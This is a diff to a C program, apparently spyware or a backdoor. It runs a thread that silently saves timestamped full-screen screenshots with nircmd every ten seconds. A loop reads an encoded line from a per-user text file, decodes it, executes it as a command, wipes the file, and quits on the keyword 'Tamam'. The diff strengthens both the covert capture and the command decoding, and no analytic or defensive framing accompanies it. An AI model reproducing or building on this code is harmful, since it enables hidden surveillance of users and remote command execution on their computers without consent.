@@ -11,7 +11,7 @@
 void *func1() {
     while (1)
     {
-        Nircmd("nircmd savescreenshot ~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png");
+        Nircmd("nircmd savescreenshotfull ~$currdate.MM_dd_yyyy$-~$currtime.HH_mm_ss$.png");
         Sleep(10000);
     }
     
@@ -24,8 +24,8 @@ void main() {
     pthread_create(th1,NULL,func1, NULL);
 
     char *combined_username = makeUsername();
-
     sizeFixer(combined_username);
+
     // Format the file name
     char filename[100];
     snprintf(filename, sizeof(filename), "%s.txt", combined_username);
@@ -65,7 +65,11 @@ void main() {
 
             // Open the file in read mode
             fgets(line, sizeof(line), user_specific_file);
-            //cipher(line, 1);
+            
+            cipher(line, 1);
+
+            
+
 
             Execute(line);
 
@@ -73,6 +77,9 @@ void main() {
             user_specific_file = fopen(filename, "w");
             fclose(user_specific_file);
     
+            if(strcmp(line, "Tamam") == 0){
+                exit(1);
+            }
         }
 
         Sleep(5000);
